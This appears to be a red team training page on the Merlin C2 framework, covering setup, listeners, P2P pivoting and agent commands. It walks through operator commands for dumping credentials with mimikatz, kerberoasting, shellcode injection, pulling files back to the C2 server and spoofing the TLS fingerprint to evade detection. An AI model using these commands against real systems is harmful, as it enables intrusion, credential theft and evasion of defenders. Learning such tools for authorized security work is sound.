---
layout: training-page
title: "Merlin C2 — Cross-Platform Post-Exploitation — Red Team Academy"
module: "C2 Frameworks"
tags:
  - c2
  - merlin
  - golang
  - http2
  - http3
  - p2p
  - quic
  - post-exploitation
page_key: "c2-merlin"
render_with_liquid: false
---

# Merlin C2

Merlin is a cross-platform post-exploitation C2 framework written in Go. It stands out for its multi-protocol agent communication — HTTP/1.1, HTTP/2, HTTP/3 (over QUIC), and peer-to-peer (P2P) over SMB, TCP, and UDP — and for security-focused features like OPAQUE authentication and dynamic JA3 fingerprint manipulation.

Key capabilities:

- **Multi-protocol**: HTTP/1.1 clear-text/TLS, HTTP/2, HTTP/2 clear-text (h2c), HTTP/3 (QUIC)
- **P2P communication**: bind or reverse connections over SMB named pipes, TCP, or UDP
- **Configurable encoding/encryption transforms**: AES, Base64, gob, hex, JWE, RC4, XOR
- **OPAQUE authentication**: Asymmetric Password Authenticated Key Exchange — the server never handles a plaintext password
- **Encrypted JWT** for message authentication
- **Dynamic JA3 hash**: change the agent's TLS fingerprint at runtime to blend with expected traffic
- **In-process .NET assembly execution** (`invoke-assembly`) or sacrificial process (`execute-assembly`)
- **execute-pe**: run arbitrary Windows PE in a sacrificial process
- **Shellcode execution**: CreateThread, CreateRemoteThread, RtlCreateUserThread, QueueUserAPC
- **Donut, sRDI, and SharpGen** integration for payload conversion
- **Mythic compatibility**: use Merlin as a Mythic agent
- **Multi-user**: merlin-cli connects over gRPC, allowing multiple operator sessions

## Install (Pre-Built)

```
mkdir /opt/merlin && cd /opt/merlin

# Linux x64:
wget https://github.com/Ne0nd0g/merlin/releases/latest/download/merlinServer-Linux-x64.7z
7z x merlinServer-Linux-x64.7z    # password: merlin

# Start the server:
sudo ./merlinServer-Linux-x64

# In a separate terminal — start the CLI:
./data/bin/merlinCLI-Linux-x64
```

The server package includes pre-compiled CLI and agent binaries for all major OS/arch combinations in `data/bin/`.

## Build from Source

```
git clone https://github.com/Ne0nd0g/merlin.git
cd merlin
go build -o merlinServer ./cmd/merlinServer/
```

Requires Go 1.21+.

## HTTP/3 (QUIC)

HTTP/3 uses QUIC (UDP-based transport) instead of TCP. This makes the agent's traffic unusual to firewall rules that block UDP-based protocols on common ports — but also distinct to packet inspectors that flag QUIC on non-443 ports.

```
# In merlin-cli, create an HTTP/3 listener:
Merlin» listeners
Merlin[listeners]» create
Merlin[listeners][create]» protocol http3
Merlin[listeners][create]» port 443
Merlin[listeners][create]» start
```

## P2P Communication

Merlin supports peer-to-peer agent chaining for networks without direct internet access.

```
# SMB named pipe (Windows):
# On the pivot agent, create an SMB listener:
Merlin[agent][pivot]» listener smb \\.\pipe\merlin

# Deploy the downstream agent pointing at the pipe:
# agent connects via \\PIVOT_HOST\pipe\merlin → relays through pivot to server
```

Supported P2P modes: `smb` (named pipe, Windows), `tcp` (direct socket), `udp`.

## Configuring an Agent

```
# In merlin-cli:
Merlin» use agent                     # list available agents
Merlin» interact <agent-id>

# Set sleep and jitter:
Merlin[agent][a1b2c3d4]» sleep 30s
Merlin[agent][a1b2c3d4]» skew 10

# Change JA3 hash (use a known-good client fingerprint):
Merlin[agent][a1b2c3d4]» ja3 771,4865-4866-4867-49195-49199-49196-49200,23-65281-10-11-35-16-5-13-18-51-45-43-27-17513,29-23-24,0
```

## Core Commands

### Execute Shell Commands

```
Merlin[agent][a1b2c3d4]» shell whoami
Merlin[agent][a1b2c3d4]» shell ipconfig /all
Merlin[agent][a1b2c3d4]» shell net group "Domain Admins" /domain
```

### .NET Assembly Execution

```
# In-process (shares memory space with agent — faster but riskier):
Merlin[agent][a1b2c3d4]» invoke-assembly Seatbelt.exe -group=user

# Sacrificial process (spawns cmd.exe or specified binary):
Merlin[agent][a1b2c3d4]» execute-assembly Rubeus.exe kerberoast /outfile:hashes.txt
```

### Arbitrary PE Execution

```
# Run a PE in a sacrificial process (does not need to be a .NET assembly):
Merlin[agent][a1b2c3d4]» execute-pe mimikatz.exe "privilege::debug sekurlsa::logonpasswords exit"
```

### Shellcode Injection

```
# Inject raw shellcode into a remote process:
Merlin[agent][a1b2c3d4]» upload /tmp/shell.bin C:\Windows\Temp\s.bin
Merlin[agent][a1b2c3d4]» createprocess cmd.exe
Merlin[agent][a1b2c3d4]» shinject <pid> C:\Windows\Temp\s.bin
```

### File Operations

```
Merlin[agent][a1b2c3d4]» upload /local/file.exe C:\Windows\Temp\file.exe
Merlin[agent][a1b2c3d4]» download C:\Users\user\Documents\passwords.txt
```

## JA3 Fingerprint Manipulation

TLS fingerprinting (JA3/JA4) is used by some EDR products and network sensors to identify non-browser TLS clients. Merlin lets you dynamically change the agent's TLS fingerprint mid-operation:

```
# Set JA3 to match Chrome 120:
Merlin[agent][a1b2c3d4]» ja3 <chrome_ja3_string>

# Or use a known-safe profile:
Merlin[agent][a1b2c3d4]» ja3 769,49171-49162-49172-49161-49159-49160-49169-49170-57-51-53-47-255,0-11-10-35-13-15,23-24-25,0
```

## OPAQUE Authentication

OPAQUE (RFC draft) is a Password Authenticated Key Exchange that prevents the server from ever seeing a plaintext password. The server stores a verifier, not the password. Even a compromised server log does not leak credentials.

```
# Configure OPAQUE at listener creation:
Merlin[listeners][create]» auth opaque
Merlin[listeners][create]» password yourstrongpassword
```

## Donut / sRDI Payload Conversion

Merlin integrates [Donut](https://github.com/Binject/go-donut) (PE/DLL/Assembly → shellcode) and [sRDI](https://github.com/monoxgas/sRDI) (DLL → shellcode) natively:

```
# Convert a .NET assembly to shellcode before injection:
Merlin» donut --arch x64 Rubeus.exe kerberoast

# Use sRDI to convert a DLL:
Merlin» srdi meterpreter.dll
```

## Resources

- Merlin GitHub — `github.com/Ne0nd0g/merlin`
- Merlin Documentation — `merlin-c2.readthedocs.io`
- [merlin-cli](https://github.com/Ne0nd0g/merlin-cli) — operator CLI
- [Merlin on Mythic](https://github.com/MythicAgents/merlin) — Mythic agent integration
- [Donut](https://github.com/Binject/go-donut) — PE to shellcode converter
- [sRDI](https://github.com/monoxgas/sRDI) — DLL to shellcode
